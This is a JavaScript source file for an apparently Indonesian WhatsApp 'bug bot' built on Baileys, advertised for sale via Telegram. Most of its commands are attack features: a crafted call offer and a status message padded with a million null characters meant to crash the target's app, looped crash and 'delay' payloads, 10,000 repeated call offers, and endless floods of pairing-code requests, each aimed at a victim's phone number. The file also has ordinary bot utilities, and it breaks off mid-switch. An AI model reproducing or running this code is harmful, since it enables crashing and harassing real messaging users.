async function croserd(Kai, isTarget) {
  let textSent = false;

  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

  const delay = ms => new Promise(r => setTimeout(r, ms));

  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[isTarget] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;
    if (wait > 0) await delay(wait);
    global.__flyingLimit[isTarget] = Date.now();
  });

  await global.__flyingMutex;

  let devices = (
    await Kai.getUSyncDevices([isTarget], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await Kai.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let yntkts = Kai.encodeWAMessage?.bind(Kai);

  Kai.createParticipantNodes = async (recipientJids, message, extraAttrs) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (Kai.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let arrayMsg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
      let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
      return memek.mutex(jid, async () => {
        let { type, ciphertext } = await Kai.signalRepository.encryptMessage({
          jid,
          data: bytes
        });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });
    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await Kai.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  let callNode = {
    tag: "call",
    attrs: { to: isTarget, id: Kai.generateMessageTag(), from: Kai.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": Kai.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity
          ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(Kai.authState.creds.account, true) }]
          : [])
      ]
    }]
  };

  await Kai.sendNode(callNode);

  if (!textSent) {
    const viewOnceMsg = generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Hallo", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await Kai.relayMessage(
      "status@broadcast",
      viewOnceMsg.message,
      {
        messageId: viewOnceMsg.key.id,
        statusJidList: [isTarget]
      }
    );

    textSent = true;
  }
}
// FUNC SPAM CALL
async function sendOfferCall(isTarget) {
    try {
        await Kai.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await Kai.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//FUNC AMPAS UI

//END
//BUTTON MESSAGE ( NOT WORK )
Kai.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Kai.sendPresenceUpdate('composing', jid)
      return Kai.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE
const ReplyKai = (teks) => {
return Kai.sendMessage(m.chat, {
video: {  
url: "https://files.catbox.moe/ya8bbk.mp4"  // Ganti dengan path video lokal Anda  
},
caption: teks,
gifPlayback: true
}, { quoted: m });
}
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: Ryclol,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const ThumbUrl = "https://files.catbox.moe/8mc9p2.png"
const ewek = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/8mc9p2.png" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": "Xatanical",
					"sellerJid": "6288287882503@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/8mc9p2.png" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Delay Crash# !`,
					"orderTitle": " Xatanical",
					"sellerJid": "6288287882503@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}

const ReplyBug = (teks) => {
    return Kai.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝚃𝚛𝚎𝚍𝚒𝚌𝚝 𝙸𝚗𝚟𝚒𝚌𝚝𝚞𝚜`,
                body: `𝚇𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/8mc9p2.png",
                sourceUrl: `Hola ${pushname}`
            }
        }
    }, { quoted: lol });
}
//END

//END
//STIKER AND BRAT FUNCTION
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Kai, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Kai.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Tredict Invictus`,
                    body: `Xatanical`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://t.me/xatanicvxii`
                }
            }
        }, { quoted: lol });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyBug('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

Kai.ments = async (text) => {
    return [m.sender];
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
case "bugmenu": {
let msgbug = `
╭─▧ \`Information Bot\`
│Owners : @Xatanicvxii
│Version : X-Whatsapp
│Telegram : t.me/Publicxata 
│Group : t.me/Xatanicvxii
│Buy Script : Chat Telegram
╰─────────────
 
╭─▧ \`ᴀʟʟ ғɪᴛᴜʀ ʙᴜɢ\`
│.xbug 𝟼𝟸𝟾×× [𝚃𝚢𝚙𝚎 𝚂𝚎𝚕𝚎𝚌𝚝]
│.blokir 𝟼𝟸𝟾×× [Block Target]
│𝙵𝚒𝚝𝚞𝚛 𝙳𝚒𝚊𝚝𝚊𝚜 𝙿𝚎𝚗𝚊𝚗𝚐𝚔𝚊𝚕 𝙱𝚞𝚐
╰─────────────
`
let buttons = [
        { buttonId: ".allmenu", buttonText: { displayText: "ALL MENU" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "BUG MENU" } },
        { buttonId: ".support", buttonText: { displayText: "SUPPORT" } }
    ];

    let buttonMessage = {
         image: { url: `https://files.catbox.moe/8mc9p2.png` },
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "Tredict Invictus"
            }
        },
        footer: "Xatanical",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await Kai.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break;
case "allmenu": {
let msgbug = `
╭─▧ \`Information Bot\`
│Owners : @Xatanicvxii
│Version : X-Whatsapp
│Telegram : t.me/Xatanicvxii
│Telegram : t.me/Publicxata 
│Buy Script : Chat Telegram
╰─────────────
 
╭─▧ \`All Fitur Bug\`
│.xbug 𝟼𝟸𝟾×× [𝚃𝚢𝚙𝚎 𝚂𝚎𝚕𝚎𝚌𝚝]
│.blokir 𝟼𝟸𝟾×× [Block Target]
╰─────────────

╭─▧ \`Command Added\`
│.ᴀᴅᴅᴘʀᴇᴍ - 𝟼𝟸𝟾×××
│.ᴅᴇʟᴘʀᴇᴍ - 𝟼𝟸𝟾×××
│.ᴀᴅᴅᴏᴡɴᴇʀ - 𝟼𝟸𝟾×××
│.ᴅᴇʟᴏᴡɴᴇʀ - 𝟼𝟸𝟾×××
╰─────────────

╭─▧ \`Tools Menu\`
│.ping
│.self
│.public
│.play 
│.ssip
│.textimage
│.catbox
│.pullupdate 
╰─────────────
`
let buttons = [
        { buttonId: ".allmenu", buttonText: { displayText: "All Fitur" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "Bug Menu" } },
        { buttonId: ".support", buttonText: { displayText: "Support Menu" } }
    ];

    let buttonMessage = {
         image: { url: `https://files.catbox.moe/8mc9p2.png` },
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "TREDICT INVICTUS"
            }
        },
        footer: "Xatanical",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await Kai.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break;

case "menu": {
let msgbug = `
╭─▧ \`Information Bot\`
│Owners : @Xatanicvxii
│Version : X-Whatsapp
│Telegram : t.me/Xatanicvxii
│Telegram : t.me/Publicxata 
│Buy Script : Chat Telegram
╰─────────────

ᴘʟᴇᴀsᴇ ᴘʀᴇss ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ᴍᴇɴᴜ.
`
let buttons = [
        { buttonId: ".allmenu", buttonText: { displayText: "ALL MENU" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "MENU BUG" } },
        { buttonId: ".support", buttonText: { displayText: "SUPPORT" } }
    ];

    let buttonMessage = {
         image: { url: `https://files.catbox.moe/8mc9p2.png` },
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "Tredict Invictus"
            }
        },
        footer: "Xatanical",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await Kai.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break;

case "support": {
let msgbug = `
╭─▧ \`𝚝𝚑𝚊𝚗𝚔𝚝𝚘\`
│ 𝙾𝚠𝚗𝚎𝚛 : 𝚡𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕
│ 𝙻𝚘𝚟𝚎𝚛𝚜 : 𝚋𝚎𝚕𝚕𝚊
╰─────────────
`
let buttons = [
        { buttonId: ".allmenu", buttonText: { displayText: "ALL MENU" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "BUG MENU" } },
        { buttonId: ".support", buttonText: { displayText: "SUPPORT" } }
    ];

    let buttonMessage = {
         image: { url: `https://files.catbox.moe/8mc9p2.png` },
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "Tredict Invictus"
            }
        },
        footer: "Xatanical",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await Kai.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break;
// All Case Fitur
case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `
╭─ ⧼ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 ⧽
│ 𝚁𝙰𝙼 : ${free_ram}/${ram}
│ 𝙲𝙾𝚁𝙴 : ${os.cpus()[0].model}
│ 𝙲𝙿𝚄 : ${os.cpus().length}
│ 𝚃𝙸𝙼𝙴 : ${Math.floor(os.uptime() / 86400)}
│ 𝚂𝙿𝙴𝙴𝙳 : ${(performance.now() - old).toFixed(5)}
╰────────────────`;
    Kai.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: lol })
}
break;
case 'play': {
    if (!q) return ReplyBug('Contoh:\n.play mangu fourtwnty');

    try {
        const api = `https://api.zenzxz.my.id/api/search/play?query=${encodeURIComponent(q)}`;
        const res = await axios.get(api);

        if (!res.data.success) return reply('❌ Lagu tidak ditemukan');

        const data = res.data.data;
        const audioUrl = data.dl_mp3;
        const meta = data.metadata;

        let caption = `
🎵 *PLAY MUSIC*
• Judul : ${meta.title}
• Durasi : ${Math.floor(meta.duration / 60)}:${meta.duration % 60}
• ID : ${meta.id}
`;

        await Kai.sendMessage(m.chat, {
            image: { url: meta.thumbnail },
            caption
        }, { quoted: lol });

        await Kai.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            ptt: false
        }, { quoted: lol });

    } catch (err) {
        console.log(err);
        reply('⚠️ Server error, coba lagi nanti');
    }
}
break;
case 'ssip': {
    if (!q) return ReplyBug(
        'Contoh:\n' +
        '.ssip Haloxata|13:00|Smartfren'
    );

    try {
        let [text, chatime, statusbartime] = q.split('|');

        if (!text || !chatime || !statusbartime) {
            return reply('Format salah!\nContoh:\n.ssip Haloxata|13:00|Smartfren');
        }

        const api = `https://api.zenzxz.my.id/api/maker/fakechatiphone?text=${encodeURIComponent(text)}&chatime=${encodeURIComponent(chatime)}&statusbartime=${encodeURIComponent(statusbartime)}`;

        await Kai.sendMessage(m.chat, {
            image: { url: api },
            caption: `📱 *Chat iPhone*\n\n💬 Text : ${text}\n🕒 Chat : ${chatime}\n📶 Status : ${statusbartime}`
        }, { quoted: lol });

    } catch (e) {
        console.log(e);
        reply('⚠️ Gagal membuat SS iPhone');
    }
}
break;
case 'textimage': {
    if (!q) return ReplyBug('Contoh:\n.textimage Hallo');

    try {
        const axios = require('axios');

        const api = `https://api.zenzxz.my.id/api/maker/animegirl/image?text=${encodeURIComponent(q)}`;

        await Kai.sendMessage(m.chat, {
            image: { url: api },
            caption: `🖼️ *Text Image Anime*\n\n📝 Text : ${q}`
        }, { quoted: lol });

    } catch (e) {
        console.log(e);
        reply('⚠️ Gagal membuat text image');
    }
}
break;
case 'catbox': {
    if (!m.quoted) return ReplyBug('Reply gambar / video / file yang mau diupload ke Catbox');

    try {

        // download media
        let media = await m.quoted.download();
        let filePath = `./temp_${Date.now()}`;

        fs.writeFileSync(filePath, media);

        let form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', fs.createReadStream(filePath));

        const res = await axios.post(
            'https://catbox.moe/user/api.php',
            form,
            { headers: form.getHeaders() }
        );

        fs.unlinkSync(filePath);

        if (!res.data) return reply('❌ Upload gagal');

        await Kai.sendMessage(m.chat, {
            text: `📦 *CATBOX UPLOAD SUCCESS*\n\n🔗 ${res.data}`
        }, { quoted: lol });

    } catch (e) {
        console.log(e);
        reply('⚠️ Gagal upload ke Catbox');
    }
}
break;

case 'pullupdate': {
    if (!isCreator) return m.reply('Owner only');

    try {
        const result = await pullUpdateTredict();

        if (result === 'NO_UPDATE') {
            return m.reply('ℹ️ Tidak ada update (file sudah versi terbaru)');
        }

        if (result === 'UPDATED') {
            return m.reply('✅ tredict.js berhasil di-update dari GitHub');
        }

    } catch (err) {
        if (err === 'FILE_NOT_FOUND') {
            return m.reply('❌ Update gagal: tredict.js tidak ditemukan di GitHub');
        }

        if (err === 'EMPTY_FILE') {
            return m.reply('❌ Update gagal: file GitHub kosong');
        }

        return m.reply('❌ Update gagal: koneksi / server error');
    }
}
break;

case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyBug("*Your Not My Onwer*")
  if (!args[0]) return ReplyBug(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Kai.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyBug(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyBug(`Number ${numero} succes add to database!`);
  break;
  case 'blokir': case 'ban': {
	if (!CreatorOnly) return ReplyBug("*Your Not My Onwer*")
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Kai.updateBlockStatus(users, 'block')
		await ReplyBug(`*[ Done ]*`)
	}
	break;
	
case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyBug("*Your Not My Onwer*")
  if (!args[0]) return ReplyBug(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyBug(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyBug("*Your Not My Onwer*")
  if (!args[0]) return ReplyBug(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Kai.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyBug(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyBug(`Number ${numero} succes add to database!`);
  break;
case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyBug("*Your Not My Onwer*")
  if (!args[0]) return ReplyBug(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyBug(`Number ${numero2} succes delate to database!`);
  break;

case 'public': {
  if (!CreatorOnly) return ReplyBug("*You're Not My Owner*");

  Kai.public = true;
  ReplyBug(`*Success: Changed Mode from Self to Public*`);
}
break;

case 'self': case 'private': {
  if (!CreatorOnly) return ReplyBug("*You're Not My Owner*");

  Kai.public = false;
  ReplyBug(`*Success: Changed Mode from Public to Self*`);
}
break;
case 'xinvis': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`𝚆𝚛𝚘𝚗𝚐 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 62𝚡𝚡`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyBug(`
『 𝗕𝗨𝗚 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗘𝗗 』
• Target
↳ ${isTarget}

• Status
↳ EXECUTION FINISHED

Result: DELAY MENTION
________________________`);
for (let i = 0; i < 100; i++) {
    await flowresInvisibleV4(isTarget)
    await sleep (2000) 
    await NullInvis(Kai, isTarget)
    await sleep (2000) 
    }
  console.log(chalk.red.bold("Meluncurkan Bug Ke Target"))
}
break;
case 'elysium': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`𝚆𝚛𝚘𝚗𝚐 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 62𝚡𝚡`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyBug(`
『 𝗕𝗨𝗚 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗘𝗗 』
• Target
↳ ${isTarget}

• Status
↳ EXECUTION FINISHED

Result: CRASH INVISIBLE IPHONE 
________________________`);

    //Paramater
    for (let i = 0; i < 1000; i++) {
    await InvisibleIphone(isTarget)
    await sleep (1000) 
    await InvisibleIphone(isTarget)
    await sleep (1000) 
    }
  console.log(chalk.red.bold("Meluncurkan Bug Ke Target"))
}
break;
case 'xforce': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`𝚆𝚛𝚘𝚗𝚐 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 62𝚡𝚡`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyBug(`
『 𝗕𝗨𝗚 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗘𝗗 』
• Target
↳ ${isTarget}

• Status
↳ EXECUTION FINISHED

Result: FORCE CLOSE INVISIBLE 
________________________`);

    //Paramater
    for (let r = 0; r < 10; r++) {
    await croserd(Kai, isTarget)
    await croserd(Kai, isTarget)
    }
  console.log(chalk.red.bold("Meluncurkan Bug Ke Target"))
}
break;

case 'spam-pairing': {
if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);
    
    let args = q.split(' ');
    let target = args[0].replace(/[^0-9]/g, '').trim();
    let count = parseInt(args[1]) || 10;
    
    let {
        default: makeWASocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion
    } = require('@whiskeysockets/baileys');
    
    let { state } = await useMultiFileAuthState('VampSystem');
    let { version } = await fetchLatestBaileysVersion();
    
    let pino = require("pino");
    let NodeCache = require("node-cache");
    let resolveMsgBuffer = new NodeCache();
    
    let sucked = await makeWASocket({
        printQRInTerminal: false,
        mobile: false,
        auth: state,
        version,
        logger: pino({ level: 'fatal' }),
        resolveMsgBuffer,
        browser: ['Mac Os', 'chrome', '121.0.6167.159']
    });
    
    m.reply(`Mengirim Spam Pairing ${count} kali ke nomor ${target}`);

    for (let i = 0; i < count; i++) {
        await sleep(1600);
        try {
            await sucked.requestPairingCode(target);
        } catch (e) {
            console.error(`Gagal spam pairing ke ${target}:`, e);
        }
    }
    
    m.reply(`Spam Pairing ke ${target} selesai`);
}
break;

case 'spamcall': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`𝚆𝚛𝚘𝚗𝚐 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 62𝚡𝚡`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyBug(`
『 𝗕𝗨𝗚 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗘𝗗 』
• Target
↳ ${isTarget}

• Status
↳ EXECUTION FINISHED

Result: CALLING TARGET
________________________`);

    //Paramater
    for (let r = 0; r < 10000; r++) {
    await sendOfferCall(isTarget)
    await sendOfferVideoCall(isTarget)
    }
  console.log(chalk.red.bold("Meluncurkan Bug Ke Target"))
}
break;
case 'spam-report': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);
    
    let target = q.replace(/[^0-9]/g, '').trim();
    
    let {
        default: makeWASocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion
    } = require('@whiskeysockets/baileys');
    
    let {
        state
    } = await useMultiFileAuthState('VampSystem');
    
    let {
        version
    } = await fetchLatestBaileysVersion();
    
    let pepec = '@s.whatsapp.net';
    let pino = require("pino");
    let NodeCache = require("node-cache");
    let resolveMsgBuffer = new NodeCache();
    
    let sucked = await makeWASocket({
        printQRInTerminal: false,
        mobile: false,
        auth: state,
        version,
        logger: pino({
            level: 'fatal'
        }),
        resolveMsgBuffer,
        browser: ['Mac Os', 'chrome', '121.0.6167.159']
    });
    
    m.reply(`Berhasil Mengirim Spam Report Unlimited Ke Nomor ${pepec}`);
    
    for (;;) {
        await sleep(1500);
        let prc = await sucked.requestPairingCode(target);
    }
}
break;
case 'nightbut': {
    if (!PremOnly) return ReplyBug("𝚈𝚘𝚞𝚛 𝙽𝚘𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖");
    if (!q) return ReplyBug(`『 *PENGGUNAAN SALAH* 』

${prefix + command} 628××××

▭▭▭▭▭▭▭▭▭▭▭`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`𝚆𝚛𝚘𝚗𝚐 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 62𝚡𝚡`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyBug(`
『 𝗕𝗨𝗚 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗘𝗗 』
• Target
↳ ${isTarget}

• Status
↳ EXECUTION FINISHED

Result: NO RESPONSE UI
________________________`);

    //Paramater
    for (let i = 0; i < 100; i++) {
    await MentionedJid(isTarget)
    await BlankMention(isTarget)
    await MentionedJid(isTarget)
    await BlankMention(isTarget)
    }
  console.log(chalk.red.bold("Meluncurkan Bug Ke Target"))
}
break;

case 'xbug': {
